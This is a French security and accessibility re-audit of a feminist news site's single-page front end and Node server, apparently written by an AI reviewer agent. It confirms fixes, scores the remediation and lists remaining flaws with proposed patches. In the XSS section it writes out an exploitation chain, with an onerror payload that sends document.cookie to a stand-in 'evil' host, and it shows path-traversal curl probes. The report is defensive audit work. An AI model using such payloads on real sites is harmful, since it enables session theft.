# VÉRIFICATION D'AUDIT — FemCurrent (post-remediation)

**Cible** : `C:\LAPOSTE\Projets\Site Zaina\index.html` — **7 278 lignes, 327 073 octets**
**Serveur** : `server.js` — écoute sur le port **3000** (`process.env.PORT || 3000`, l. 13)
**Référentiel** : WCAG 2.2 AA · OWASP Top 10 2021 · Core Web Vitals · barème qualité design
**Vérificateur** : 严过审 (critique-reviewer) — **lecture seule**, aucune modification de `index.html`
**Méthode** : exécution réelle du serveur (`node server.js` + `curl --noproxy '*' --path-as-is`) · re-calcul
indépendant des ratios de contraste (script Node, formule WCAG 2.1) · analyse statique ligne par ligne
du fichier courant · comparaison `index.html` ↔ `DESIGN-TOKENS.md` ↔ `AUDIT-RAPPORT.md`

> **Principe appliqué** : le message de commit n'est pas une preuve. Seuls les octets du fichier et les
> réponses HTTP réellement observées font foi.

---

## A. RÉSUMÉ EXÉCUTIF

### Note globale : **41 / 100  →  51 / 100**

| Sous-domaine | Avant | Après | Justification |
|---|---|---|---|
| Accessibilité (WCAG 2.2 AA) | 30 | **50** | Lien d'évitement, focus SPA, piège de focus, `aria-*`, repli `<noscript>` et compteurs de l'Observatoire **corrigés et mesurés**. Mais **6 couples de contraste échouent toujours AA** et **30/30 `<label>` restent non associés**. |
| Performance | 35 | **55** | gzip actif (**327 073 → 72 914 o, −77,7 %**), polices non bloquantes, favicon léger. Restent : 26 `<img>` dont 15 sans `loading`, aucun `width/height`, calque `.grain` plein écran. |
| Hiérarchie éditoriale | 45 | **50** | Compteurs lisibles, état actif de nav, onglets stylés. Restent : **corps d'article toujours sans CSS** (`.article-body-content`), **saut h1→h3 toujours présent**. |
| Cohérence du design system | 40 | **40** | ⚠️ **Aucun jeton corrigé appliqué** : `DESIGN-TOKENS.md` spécifie 4 jetons `-ink`, `index.html` en contient **0**. 452 styles inline (vs 447). CSS morte ajoutée. |
| Qualité du code | 30 | **50** | Assainisseur réel, traversée de répertoire colmatée, 6 composants morts ressuscités, formulaires honnêtes. Mais **2 puits XSS non colmatés** + CSS morte. |
| Spécificité / identité | 60 | **60** | Inchangé : `picsum.photos` toujours actif, partenaires toujours inventés. |
| Sécurité | 15 | **55** | Traversée **vérifiée 403**, en-têtes émis, gzip. Mais XSS résiduel + CSP inopérante + pas de CSP côté serveur. |

### Verdict : **TOUJOURS REFUSÉ**

**12 des 14 bloquants sont réellement corrigés** — la remediation est substantielle et honnête sur le
fonctionnel, l'accessibilité clavier et la sécurité serveur. Mais **3 défauts P0 subsistent**, dont une
**XSS toujours exploitable**, et **le volet couleur de `DESIGN-TOKENS.md` n'a jamais été appliqué** :
le fichier de spécification a été livré, le code ne l'a jamais consommé.

> **Ligne de fond** : la remediation a réparé *le comportement* (composants, focus, formulaires, serveur)
> mais n'a pas réparé *la matière* (couleurs, contraste, hiérarchie typographique, assainissement complet).
> Le site fonctionne mieux ; il n'est toujours pas publiable en l'état.

---

## B. VÉRIFICATION BLOQUANT PAR BLOQUANT (B-01 → B-14)

### B. Exécution — preuves HTTP réelles

```
$ node server.js                       → "FemCurrent server running on port 3000"
$ curl --noproxy '*' --path-as-is \
      http://127.0.0.1:3000/../package.json        → HTTP 403   (13 o)
$ curl --noproxy '*' --path-as-is \
      http://127.0.0.1:3000/../../Windows/win.ini  → HTTP 403   (13 o)
$ curl --noproxy '*' --path-as-is \
      http://127.0.0.1:3000/..%2f..%2fWindows%2fwin.ini → HTTP 403   (13 o)
```

En-têtes réellement émis sur `GET /` :

```
HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Permissions-Policy: geolocation=(), microphone=(), camera=()
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache
Vary: Accept-Encoding
```

Autres comportements serveur vérifiés : `Accept-Encoding: gzip` → `Content-Encoding: gzip`,
`Content-Length: 72 914` ; `GET /public/nope.png` → **404** ; `POST /` → **405** ;
`GET /qui-sommes-nous` → **200** (fallback SPA légitime).

> ⚠️ **`Content-Security-Policy` est ABSENTE des en-têtes serveur.** L'objet `SECURITY_HEADERS`
> (`server.js` l. 52–57) contient exactement 4 entrées, aucune n'est une CSP. La CSP du projet existe
> uniquement comme **balise `<meta>`** (`index.html` l. 10).

---

### Tableau de vérification

| # | Bloquant | Statut | Preuve (lignes du fichier **courant**) |
|---|---|---|---|
| **B-01** | XSS — contenu WordPress injecté sans assainissement | 🔴 **PARTIEL — TOUJOURS P0** | Assainisseur réel `sanitizeHtml()` l. **3278-3294** (DOMParser + liste blanche) appliqué en **3377, 3405, 3433, 3472**. **Non appliqué** en **3589-3590** (`formatWpEvent`) et **3611** (`formatWpPage`) → rendus bruts en **6020** et **6368**. Vecteur supplémentaire `decodeEntities()` l. **3203** (voir D-1). |
| **B-02** | Path traversal | ✅ **CORRIGÉ** | `server.js` l. 120-131 : `path.resolve(ROOT, '.' + target)` + contrôle `startsWith(ROOT + path.sep)`. **Vérifié par exécution : 403 sur les 3 variantes** (brute, double, encodée `%2f`). |
| **B-03** | Accordéon FAQ inerte | ✅ **CORRIGÉ** | CSS l. **2672-2677** (`.acc`, `.acc > button`, `.acc-body{display:none}`, `.acc.open .acc-body{display:block}`), keyframe `fadeUp` l. **2754**, binding l. **6779-6786** avec `aria-expanded` synchronisé. *(1 résidu cosmétique, voir D-6.)* |
| **B-04** | Filtres sans effet (`.hide` non défini) | ✅ **CORRIGÉ** | `.hide { display: none !important; }` l. **2683** ; binding l. **6789-6810** : `role="button"`, `aria-pressed` synchronisé, filtrage réel via `data-cat`. |
| **B-05** | Signalement TFGBV impossible à envoyer | ✅ **CORRIGÉ** | Branche `else if (activePanel === "cyber")` l. **6989-6993** : lit `cyber_platform`, `cyber_desc`, `cyber_support`, pose `name = "Signalement TFGBV"`. Panneau `#lum-cyber` l. **6457**. |
| **B-06** | Partage cassé + `sharePop` inexistante | ✅ **CORRIGÉ** | `shareBar()` réécrite l. **4298-4307** : URL construites côté JS (`encodeURIComponent(location.href)`), `rel="noopener noreferrer"`, `aria-label`. `window.copyLink` défini l. **4308-4310**. **0 occurrence résiduelle de `sharePop`**. |
| **B-07** | Succès de formulaire mensonger | ✅ **CORRIGÉ** | Condition stricte `if (res.ok && data.success)` l. **6854** ; 5 `catch` honnêtes : **6862-6864, 6909-6911, 6955-6957, 7043-7045, 7085-7087** — aucun n'affiche le bloc de succès. `console.error` systématique. |
| **B-08** | Site vide sans JavaScript | ✅ **CORRIGÉ** | `<noscript>` l. **3055-3066** avec `.noscript-fallback` (CSS l. **2747-2751**) : `<h1>`, texte, liens de repli. |
| **B-09** | Chiffres de l'Observatoire invisibles | ✅ **CORRIGÉ — mesuré** | `.counter b` l. **1194** : `color:#FFB3D1; -webkit-text-fill-color:#FFB3D1`, `background` supprimé → **11,39:1** sur `#1A072A` (au lieu de 1,53:1). `.foot-word em` l. **1441-1446** : `#F3CEEA` → **13,39:1**. |
| **B-10** | Icônes-only sans nom accessible | ✅ **CORRIGÉ** | `aria-label` l. **2805, 2808, 2811, 2850, 2871, 2893, 2897, 3171** + `aria-hidden="true" focusable="false"` sur les SVG l. **2806, 2809, 2812**. Cibles portées à **44×44** (`!important`) l. **2737**. *(12 SVG/39 sans `aria-hidden`, P2.)* |
| **B-11** | Drawer : pas de piège ni retour de focus | ✅ **CORRIGÉ** | `trapTabInDrawer()` l. **7125-7137**, `lastFocusedBeforeDrawer` l. **7123**, `toggleDrawer()` l. **7139-7158** (focus premier élément, `aria-hidden`, `aria-expanded` sur burger, retrait du listener, restauration du focus). Recherche : focus mémorisé/restauré l. **7222-7240**. |
| **B-12** | Perte du focus après navigation SPA | ✅ **CORRIGÉ** | l. **6635-6637** : `APP.setAttribute("tabindex","-1")`, `APP.focus({preventScroll:true})`, `scrollTo({behavior:"auto"})`. Région live `routeStatus` l. **6644-6653** (`role="status"` + `aria-live="polite"` + `.sr-only`). |
| **B-13** | Aucun lien d'évitement | ✅ **CORRIGÉ** | `<a class="skip-link" href="#app">Aller au contenu principal</a>` l. **2775**, première ligne de `<body>` ; CSS l. **2634-2651**. |
| **B-14** | Animations en boucle sans contrôle de pause | 🟠 **PARTIEL** | `@media (prefers-reduced-motion: reduce)` complet l. **2758-2768**. Pause au survol/`:focus-within` l. **2718-2719**. **Mais `.mq-pause` (l. 2720-2734) est du CSS mort : 0 occurrence dans le markup et 0 dans le JS** — aucun bouton pause n'existe dans le DOM. |

**Bilan B : 12 corrigés · 2 partiels (dont 1 toujours P0).**

---

## C. MAJEURS (P1) — 23 au départ

| Répartition | Nombre | Détail |
|---|---|---|
| ✅ **Clos** | **6 / 23** | M-01, M-02, M-09, M-15, M-17, M-18 |
| 🟠 **Partiels** | **3 / 23** | M-10, M-12, M-16 |
| 🔴 **Ouverts** | **14 / 23** | M-03, M-04, M-05, M-06, M-07, M-08, M-11, M-13, M-14, M-19, M-20, M-21, M-22, M-23 |

### Détail des P1 clos (vérifiés)

- **M-01 · État actif de navigation** — `[data-nav].current::after` l. **2705-2712**, coloration l. **2713-2714**, `setActiveNav()` l. **6657-6665** pose `aria-current="page"` et `.current`. Le sélecteur mort `nav.main` a disparu (**0 occurrence**), `data-nav` est présent **24 fois**.
- **M-02 · Titre dupliqué** — `render()` l. **6633-6634** : suffixe `· FemCurrent` ajouté une seule fois si absent.
- **M-09 · Onglets sans état ni sémantique** — CSS l. **1233-1241** + **2695-2701** (`.lum-tab[aria-selected="true"]` fond violet-blanc) ; JS l. **6812-6825** pose `role="tab"` / `aria-selected` et bascule `.lum-panel.on`.
- **M-15 · Polices bloquantes** — `preload` + feuille chargée en `media="print"` puis commutée l. **17-18**, repli `<noscript>` l. **19**.
- **M-17 · Faux 404 en 200** — `ASSET_EXT` l. **40-43** + branche l. **148-152**. **Vérifié : `/public/nope.png` → 404.**
- **M-18 · Cache sans immutable** — `cacheControlFor()` l. **61-65** : `no-cache` partout sauf `/public/**` et `/logo/**` en `max-age=31536000, immutable`.

### Détail des P1 partiels

- **M-10 · Accordéons du drawer** 🟠 — `aria-expanded="false"` et `aria-controls` présents au markup
  l. **2917, 2933, 2963**, mais le gestionnaire l. **7164-7169** ne fait que `item.classList.toggle("open")`
  et **ne met jamais à jour `aria-expanded`** : les 3 boutons restent figés à `"false"` après ouverture.
  Seul `#dEspaces` est correctement synchronisé (l. **7180**).
- **M-12 · Dimensionnement d'images** 🟠 — `loading=` présent **11 fois** sur **26 `<img>`** ; aucun
  `width`/`height` attributaire, aucun `srcset`, `decoding=` **0 occurrence**.
- **M-16 · En-têtes serveur / compression** 🟠 — compression ✅ (−77,7 %), 4 en-têtes ✅,
  **mais `Content-Security-Policy` absente de `SECURITY_HEADERS`** (`server.js` l. 52-57).

### Les 14 P1 ouverts — renvoi vers la section D

M-06 et M-08 sont **promus P0** dans cette vérification (voir D-2, D-3) : ce sont des échecs
WCAG de niveau A/AA mesurés, sur un site traitant de signalements de violences.

---

## D. REGISTRE DES DÉFAUTS RÉSIDUELS

### 🔴 P0-1 · XSS toujours exploitable — 2 puits non assainis + vecteur `decodeEntities`

**Sévérité** : P0 · **Norme** : OWASP A03:2021 · CWE-79

L'assainisseur est **réel** — il faut le dire clairement. `sanitizeHtml()` (l. 3278-3294) parse via
`DOMParser`, supprime d'emblée `script, style, iframe, object, embed, form, input, button, select,
textarea, link, meta, base, noscript, svg, math, template, frame, frameset` (l. 3287), puis
`cleanEl()` (l. 3251-3275) applique une **liste blanche** de 24 balises et 7 attributs, retire tout
attribut commençant par `on`, et repasse chaque URL par `safeUrl()` (l. 3242-3249) qui refuse
`javascript:`/`data:`/`vbscript:`/`file:`/`blob:`. Ce n'est pas un assainisseur cosmétique.

**Mais il n'est appliqué que sur 4 des 7 points d'entrée WordPress.**

**(a) Contenu d'événement — non assaini**

```js
// index.html:3589-3590  (formatWpEvent)
    content: rawContent || plainText,      // ← HTML brut de l'API WP
    body: [rawContent || plainText]        // ← jamais passé par sanitizeHtml()
```

Rendu tel quel :

```js
// index.html:6020
${e.body ? e.body.map(p => p.startsWith('<') ? p : `<p>${p}</p>`).join('') : (e.content || ...)}
```

Le test `p.startsWith('<')` **court-circuite volontairement l'échappement** : toute chaîne commençant
par `<` est injectée directement dans le HTML de la vue, puis dans `APP.innerHTML` (l. **6631**).

**(b) Contenu de page — non assaini**

```js
// index.html:3611  (formatWpPage)
    content: p.content && p.content.rendered ? p.content.rendered : ""   // ← brut
```
```js
// index.html:6277 → 6368
const contentHtml = wpPage && wpPage.content ? wpPage.content : `…`
…
        ${contentHtml}          // → APP.innerHTML (l. 6631)
```

**(c) Vecteur transversal : `decodeEntities()` réintroduit le HTML**

```js
// index.html:3203-3209
function decodeEntities(str) {
  const el = document.createElement("textarea");
  el.innerHTML = str;
  return el.value || str;      // ← &lt;img src=x onerror=…&gt; redevient <img src=x onerror=…>
}
```

L'API WordPress renvoie `title.rendered` **déjà échappé** (`&lt;`). `decodeEntities()` annule cet
échappement. Or les titres/noms sont ensuite interpolés **sans `esc()`** dans les gabarits —
`esc()` n'est appelé qu'à **4 endroits** (l. 3377, 3405, 3433, 3472), **jamais dans un gabarit** :

- `<h3>${a.title}</h3>` l. **4314** · `${f.name}` l. **4319** · `${i.name}` l. **4323** · `${d.title}` l. **4327**
- `alt="${e.title}"` l. **6011** — **injection d'attribut** : un titre contenant `"` referme l'attribut
  et permet d'ajouter `onerror=` / `onload=`.

Chaîne d'exploitation : contributeur WP → titre `<img src=x onerror=fetch('//evil/'+document.cookie)>`
→ `&lt;img…&gt;` par l'API → `decodeEntities()` → `<img…>` → `${a.title}` → `innerHTML` → **exécution**.

**(d) La CSP ne protège pas contre ces vecteurs**

```html
<!-- index.html:10 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self';
  script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  …">
```

`script-src … 'unsafe-inline'` **autorise expressément les gestionnaires d'événements inline**
(`onerror=`, `onload=`) : la CSP ne bloque aucun des vecteurs ci-dessus. De plus, une CSP en balise
`<meta>` ne peut pas porter `frame-ancestors` (ignoré par les navigateurs) et n'est pas émise sur
les sous-ressources.

**Correctif exact**

```js
// 1) 3589-3590  →  body: [sanitizeHtml(rawContent) || esc(plainText)], content: sanitizeHtml(rawContent) || esc(plainText)
// 2) 3611       →  content: sanitizeHtml(p.content && p.content.rendered ? p.content.rendered : "")
// 3) 3203       →  après decodeEntities, NE PAS réintroduire de balises :
function decodeEntities(str){ /* … */ return out.replace(/[<>"']/g, c => ({'<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
//    OU, préférable : appliquer esc() à CHAQUE interpolation de texte distant dans les gabarits
//    (4314, 4319, 4323, 4327, 4632, 4730, 4754, 6011, 6268 …)
// 4) index.html:10 → retirer 'unsafe-inline' de script-src ; déplacer les scripts inline (3181+)
//    dans un fichier externe ou les signer par nonce/hash.
// 5) server.js:52 → ajouter la CSP à SECURITY_HEADERS (double émission header + meta).
```

---

### 🔴 P0-2 · Contrastes AA toujours en échec — les jetons corrigés n'ont jamais été appliqués

**Sévérité** : P0 · **Norme** : WCAG 2.2 – 1.4.3 Contraste minimum (AA)

`DESIGN-TOKENS.md` (l. 139-155) définit `--gris-ink #595959`, `--magenta-ink #C2185B`,
`--orange-ink #A35500`, `--orange-deep-ink #B33E00`, `--li-ink`, `--wa-ink`.
**`index.html` en contient 0.** `grep -- "-ink" index.html` → **0 résultat**. Le bloc `:root`
(l. **24-76**) est **strictement identique à l'original** : `--orange: #FF8C00`, `--magenta: #E91E63`,
`--gris: #6B6B6B`, `--orange-deep: #E65100`.

Ratios **recalculés indépendamment** (formule WCAG 2.1) sur les valeurs réellement déclarées :

| # | Couple (valeurs réelles de `:root`) | Ratio mesuré | Seuil AA | Verdict |
|---|---|---|---|---|
| C2 | `--orange #FF8C00` / `#FFFFFF` | **2,33:1** | 4,5 | ❌ **ÉCHEC** |
| C10 | `--orange-deep #E65100` / `#FFFFFF` | **3,79:1** | 4,5 | ❌ **ÉCHEC** (≥ 3 → grand texte only) |
| C11 | `#E65100` / fond effectif `#FFEED9` (`.tag.orange`) | **3,34:1** | 4,5 | ❌ **ÉCHEC** |
| C3 | `--magenta #E91E63` / `#FFFFFF` | **4,35:1** | 4,5 | ❌ **ÉCHEC** (0,15 sous le seuil) |
| B4 | `#FFFFFF` / `#25D366` (WhatsApp) | **1,98:1** | 4,5 | ❌ **ÉCHEC GRAVE** |
| B8 | `#25D366` sur tint `.15` → `#DEF8E8` (`.d-action-wa`) | **1,77:1** | 4,5 | ❌ **ÉCHEC GRAVE** |
| B5 | `#FFFFFF` / `#FF8C00` | **2,33:1** | 4,5 | ❌ **ÉCHEC** |
| D8 | `#E91E63` / `#1B0B2E` (magenta sur nuit) | **4,26:1** | 4,5 | ❌ **ÉCHEC** |
| D9 | `#E91E63` / `#2E1143` | **3,78:1** | 4,5 | ❌ **ÉCHEC** |

À titre de contrôle, les valeurs de `DESIGN-TOKENS.md` ont été re-calculées : **elles sont exactes**
(`#A35500` → 5,45:1 ; `#C2185B` → 5,87:1 ; `#595959` → 7,00:1 ; `#B33E00` → 5,82:1). La spécification
est fiable — **elle n'a simplement jamais été branchée**.

**Correctif** : insérer le bloc `:root` de `DESIGN-TOKENS.md` § « Tokens corrigés » (l. 137-160) dans
`index.html` l. 24-76, puis appliquer la table de remplacement R8/R9b/R11/R11b/R12/R15b
(`DESIGN-TOKENS.md` l. 545-560). Les usages sur fond sombre (D7 `#FF8C00` → 8,13:1) sont à conserver.

---

### 🔴 P0-3 · Aucun `<label>` associé à son champ (30 / 30)

**Sévérité** : **P0** (promu depuis M-08) · **Norme** : WCAG 2.2 – 1.3.1 (A) · 4.1.2 (A) · 3.3.2 (A)

`grep -c "<label"` → **30** · `grep -c "<label for="` → **0**. Les `<label>` sont des **frères** des
champs, jamais des conteneurs, et les champs n'ont aucun `id` :

```html
<!-- index.html:6049-6050 -->
<label>Nom &amp; Prénom *</label>
<input type="text" name="name" required placeholder="Ex : Marie Kabila">
```

Aucune association programmatique. Un lecteur d'écran annonce un champ sans nom. Cela concerne
**le formulaire de signalement TFGBV** (`#lum-cyber`) — le plus sensible du site.
*Promotion justifiée : échec de niveau A (et non AA) sur un formulaire de signalement de violences.*

**Correctif** : attribuer un `id` unique à chaque champ et `for=` au `<label>` correspondant
(30 paires : l. 6049, 6053, 6060, 6064, 6070, 6389 + les panneaux `#lum-*` et `#contactForm`).

---

### 🟠 P1 — défauts majeurs résiduels

| # | Défaut | Preuve | Correction |
|---|---|---|---|
| **M-07** | **Corps d'article toujours sans aucun style** | `.article-body-content` : **7 usages** (l. 5187, 5488, 5644, 6019, 6261, 6367, 6606), **0 règle CSS** | Définir `.article-body-content{font-size:1.0625rem;line-height:1.75;max-width:68ch}` + `h2/h3/p/ul/blockquote` descendants |
| **M-20** | **Saut h1→h3 persistant sur la home** | `vHome()` l. 4577 : `<h1>` l. **4631** (titre du 1ᵉʳ article) puis `<h3>` l. **4661, 4680, 4699** ; les `<h2>` de section n'apparaissent qu'ensuite (l. 4726, 4739…) | `<h1>` = titre de page ; titres d'articles en `<h2>` ; sections en `<h2>` ; jamais de h3 sans h2 parent |
| **M-04** | Styles inline | **452** occurrences (`style="` ) — *en hausse* vs 447 | Migration vers classes du design system |
| **M-11** | `alt=""` sur images porteuses de sens | **9** `alt=""` / 17 `alt` renseignés | Renseigner les 9 |
| **M-14** | Calque `.grain` plein écran | l. **145-155** : `position:fixed; inset:-50%; width:200%; height:200%; mix-blend-mode:multiply` — `opacity` réduite à 0,035 mais le calque composite toujours tout le viewport | Le supprimer, ou le limiter à `opacity:.02` **sans** `mix-blend-mode` et sans `inset:-50%` |
| **M-13** | `picsum.photos` toujours actif | `IMG()` l. **3197** = `https://picsum.photos/seed/…` — photos **aléatoires** sur un média d'information | Servir des visuels réels depuis `/public/images/` avec un repli local |
| **M-19** | `body.lock` sans compensation de barre de défilement | **0 occurrence de `paddingRight`** | `document.body.style.paddingRight = o ? (innerWidth - documentElement.clientWidth)+"px" : ""` |
| **M-03 / M-05** | Hauteur de chrome / nav défilante | Non mesurable statiquement de façon fiable — **non clos par absence de preuve** | Mesure navigateur requise |
| **M-21 / M-22 / M-23** | Partenaires inventés · données fabriquées · métas non exposées | Contenu éditorial inchangé | Arbitrage éditorial hors périmètre technique |

### 🟡 P2 — défauts mineurs nouveaux ou résiduels

| # | Défaut | Preuve |
|---|---|---|
| **D-6** | **Chevron d'accordéon non rotatif** — la CSS cible `.acc > button .acc-chev` (l. 2674-2675) mais le markup produit `<span>▾</span>` **sans classe** (l. 6581) | CSS morte par désaccord markup/CSS |
| **D-7** | **CSS morte `.mq-pause`** (l. 2720-2734) — stylée, jamais instanciée | 0 occurrence hors CSS |
| **D-8** | **Pas d'`aria-controls` sur l'accordéon FAQ**, pas de `type="button"` sur le bouton (l. 6579) | ARIA incomplet |
| **D-9** | **12 SVG sur 39 sans `aria-hidden`** | 27 `aria-hidden="true"` / 39 `<svg` |
| **D-10** | **`<nav class="site-nav-desktop">` sans `aria-label`** (l. 2830) — 3 `<nav>` dans la page, 2 labellisés seulement | Navigation principale non nommée |
| **D-11** | **Arrière-plan non `inert`** à l'ouverture du drawer / de la recherche — `[inert]` CSS existe (l. 2669), l'attribut n'est **jamais posé** | Le curseur virtuel des lecteurs d'écran sort du modal |
| **D-12** | **Pas de piège de focus dans `#searchOverlay`** (seul le drawer en a un) | `openSearch()` l. 7222-7230 |
| **D-13** | `onclick="copyLink()"` inline (l. 4305) — cassera dès que `'unsafe-inline'` sera retiré de la CSP | À convertir en `addEventListener` |

---

## E. NOUVELLE NOTATION — 5 DIMENSIONS

| Dimension | Avant | **Après** | Justification |
|---|---|---|---|
| **Philosophie** | 3/5 | **3/5** | L'intention reste réelle et documentée. Mais le système de design *corrigé* — 4 jetons `-ink` calculés au dixième de ratio près dans `DESIGN-TOKENS.md` — **existe sur le papier et nulle part dans le code** (0 occurrence). 452 styles inline (+5), CSS morte ajoutée (`.mq-pause`, `.acc-chev`). La direction est toujours contredite par l'exécution. |
| **Hiérarchie** | 2/5 | **3/5** | Gains réels et mesurés : compteurs de l'Observatoire **1,53 → 11,39:1**, état actif de nav enfin visible (l. 2705-2714), onglets enfin différenciés, lien d'évitement. Mais les deux manquements structurants demeurent : **corps d'article sans aucune CSS** (7 usages / 0 règle) et **saut h1→h3** sur la home. 3/5 en bas de fourchette. |
| **Exécution** | 2/5 | **3/5** | Les **6 composants morts sont ressuscités et vérifiés** : accordéon, filtres, TFGBV, partage, état de nav, état d'onglets. Formulaires devenus honnêtes (5/5). Gestion du focus complète. Serveur durci (traversée 403 vérifiée, gzip −77,7 %, vraies 404). Restent : 3 puits XSS, 30 labels non associés, 3 `aria-expanded` désynchronisés, CSS morte. |
| **Spécificité** | 3/5 | **3/5** | **Rien n'a changé.** `picsum.photos` sert toujours des photos aléatoires à un média d'information (l. 3197), les partenaires restent inventés, `✦` et dégradés interchangeables toujours présents. Le fond est spécifique, la forme reste un template. |
| **Réserve** | 2/5 | **2/5** | Seule dimension **non améliorée**. `prefers-reduced-motion` est désormais respecté (l. 2758-2768) — vrai gain. Mais : **aucun bouton pause n'existe** (CSS `.mq-pause` morte), le calque `.grain` composite toujours tout l'écran avec `mix-blend-mode`, les styles inline passent de 447 à **452**, et la remediation a *ajouté* de la CSS morte. La quantité de décoration n'a pas baissé. |

**Total : 14 / 25** (contre 12/25)

### Conclusion

Chaque dimension est ≥ 3 **sauf Réserve (2/5)**. Surtout, **le nombre de défauts P0 n'est pas nul (3)**.

> **🔴 VERDICT : TOUJOURS REFUSÉ.**
> Condition de passage = toutes les dimensions ≥ 3 **ET** zéro P0. Les deux échouent.

---

## F. RE-CONTRÔLE ANTI-SLOP

| Contrôle | Seuil | État | Preuve |
|---|---|---|---|
| Dégradé violet / arc-en-ciel en fond de page | P0 | ⚠️ **Atténué** | Plus de `background-clip:text` sur fond sombre (l. 1194, 1441 corrigés). Dégradés toujours présents en aplat (l. 49-54). |
| Statistiques ou témoignages fabriqués | P0 | 🔴 **ÉCHEC** | M-22 non traité — chiffres et partenaires inventés inchangés. |
| Emoji en guise d'icônes professionnelles | P0 | 🟠 **Partiel** | SVG majoritaires ; persistent `✦`, `▾`, `⏳`, `🎓`, `✕` en texte (l. 6581, 2893, 6027, 6005). |
| Cartes à bordure colorée à gauche (tic AI) | P0 | 🔴 **ÉCHEC** | `border-left:5px solid #E91E63` l. **6278** ; `border-top: 4px` multicolore conservé. |
| Illustrations SVG « dessinées à la main » | P0 | ✅ **OK** | Aucune détectée. |
| Mise en page cassée / débordement | P0 | ✅ **OK** | Aucun indice statique ; non vérifiable sans navigateur. |
| **Contraste texte < WCAG AA** | **P0** | 🔴 **ÉCHEC** | **9 couples mesurés en échec**, dont 2 graves à **1,77:1** et **1,98:1**. Voir D-0-2. |
| Absence totale de responsive | P0 | ✅ **OK** | Grilles auto-fit et medias queries présentes. |
| Inter en police de display | P1 | ✅ **OK** | `Fraunces` en `--display` (l. 56), `Archivo` en corps (l. 57), `Space Mono` en accent. |
| Empilement de rayons et d'ombres | P1 | 🟠 **Partiel** | 5 niveaux d'ombre conservés (l. 67-71). |
| Densité / manque de blanc | P1 | 🟠 **Partiel** | 452 styles inline maintiennent une forte densité. |
| ≥ 4 couleurs simultanées | P1 | 🔴 **ÉCHEC** | Violet + magenta + orange + lavande + gris systématiquement combinés. |
| Animations > 0,3 s sans repli `reduced-motion` | P1 | ✅ **OK** | `@media (prefers-reduced-motion)` l. 2758-2768 couvre tout. |
| Largeur de paragraphe > 75 caractères | P1 | 🟠 **Partiel** | `.container` l. 135 `min(1240px,92%)` — non borné en `ch`. |
| Plus de 2 CTA par écran | P1 | 🔴 **ÉCHEC** | Header : 2 CTA + 3 icônes ; home empile 6 blocs « Voir tout → ». |
| États hover/focus manquants | P2 | 🟠 **Partiel** | `:focus-visible` global l. **129-133**. Hover absent sur certains composants. |
| Tailles d'icônes hétérogènes | P2 | 🟠 **Partiel** | 13/14/28/36 px coexistent (l. 2812, 2809, 2805, 2850) ; cibles normalisées à 44 px en CSS (l. 2737). |
| `alt` manquant | P2 | 🟠 **Partiel** | 9 `alt=""` sur images porteuses de sens. |

**Anti-Slop : 3 échecs P0 · 3 échecs P1 · 3 partiels P1/P2.**

---

## G. ACTIONS PRIORITAIRES

### Immédiat — avant toute nouvelle revue (bloquant)

1. **Colmater les 2 puits XSS** — appliquer `sanitizeHtml()` en `index.html` **3589-3590** et **3611**. *Effort : 2 lignes.*
2. **Ne plus réintroduire de balises dans `decodeEntities()`** (l. 3203) **ou** appliquer `esc()` à
   chaque interpolation de texte distant (l. 4314, 4319, 4323, 4327, 4632, 6011…). *C'est le vecteur
   le plus discret et le plus large.*
3. **Brancher les jetons `-ink`** de `DESIGN-TOKENS.md` (l. 137-160) dans le `:root` d'`index.html`
   (l. 24-76) + appliquer la table R8→R15b. *9 échecs AA disparaissent d'un coup.*
4. **Associer les 30 `<label>`** (`for=` + `id=`). *Échec niveau A sur un formulaire TFGBV.*

### Court terme — P1 structurants

5. Écrire la CSS de **`.article-body-content`** (7 usages, 0 règle) — condition *sine qua non* pour
   que Hiérarchie dépasse 3/5.
6. Corriger la structure de titres de la home : `<h1>` = titre de page, articles en `<h2>`.
7. Retirer `'unsafe-inline'` de `script-src` (l. 10) et déporter la CSP dans `server.js` l. 52-57.
8. Synchroniser `aria-expanded` dans le gestionnaire d'accordéons du drawer (l. 7164-7169).
9. Supprimer `picsum.photos` (l. 3197) au profit de visuels réels.
10. Supprimer la CSS morte `.mq-pause` (l. 2720-2734) **ou** instancier enfin le bouton pause
    (WCAG 2.2.2, B-14).

### Moyen terme — pour viser ≥ 70/100

11. Compenser la barre de défilement (`paddingRight`, M-19) ; poser `inert` sur l'arrière-plan des modales ;
    piéger le focus dans `#searchOverlay`.
12. Réduire les 452 styles inline ; documenter `.grain` ou le retirer.
13. Résoudre l'arbitrage éditorial : partenaires inventés, données fabriquées (M-21, M-22, M-23).
14. Repasser l'Anti-Slop : `border-left` coloré (l. 6278), emoji en guise d'icônes, CTA surnuméraires.

---

## H. LIMITES DE CETTE VÉRIFICATION

Déclarées pour que le lecteur sache exactement ce qui est prouvé et ce qui ne l'est pas :

- **Exécuté et prouvé** : traversée de répertoire (3 variantes), en-têtes HTTP, gzip, 404 assets,
  405 méthodes, fallback SPA, liste des jetons `:root`, tous les ratios de contraste, tous les
  comptages de motifs (labels, SVG, `alt`, styles inline, occurrences de classes).
- **Vérifié statiquement, non exécuté** : comportement DOM de l'accordéon, des filtres, du piège de
  focus, du routage SPA. Aucun navigateur headless n'a été lancé ; la logique a été lue ligne à ligne,
  pas observée à l'écran. Un test navigateur reste nécessaire pour clore définitivement B-03, B-11, B-12.
- **Non vérifiable statiquement** : M-03 (hauteur de chrome), M-05 (nav défilante), tout critère
  visuel ou de mise en page effective. Ces points restent ouverts **par absence de preuve**, ce qui
  n'est pas la même chose que « corrigé ».

---

*Rapport produit par 严过审 (critique-reviewer) — vérification en lecture seule. Aucune modification
apportée à `index.html`, `server.js`, `AUDIT-RAPPORT.md` ou `DESIGN-TOKENS.md`.*
